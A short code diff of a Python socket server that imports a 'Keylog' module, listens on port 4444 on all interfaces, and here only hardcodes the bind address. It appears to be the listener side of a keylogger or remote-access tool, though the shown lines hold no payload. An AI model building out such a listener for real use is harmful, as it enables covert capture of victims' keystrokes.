@@ -18,6 +18,7 @@ import Keylog
 from tkinter import *
 import signal
 
+HOST = "0.0.0.0"
 PORT = 4444
 img_bytes = b'\x00\x01\x02...'
 
@@ -30,7 +31,7 @@ EXIT = "exit"
 
 class Server:
     def __init__(self, host):
-        self.host = host
+        self.host =HOST  # host
         print(self.host + " " + str(PORT))
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP
         self.server.bind((self.host, PORT))
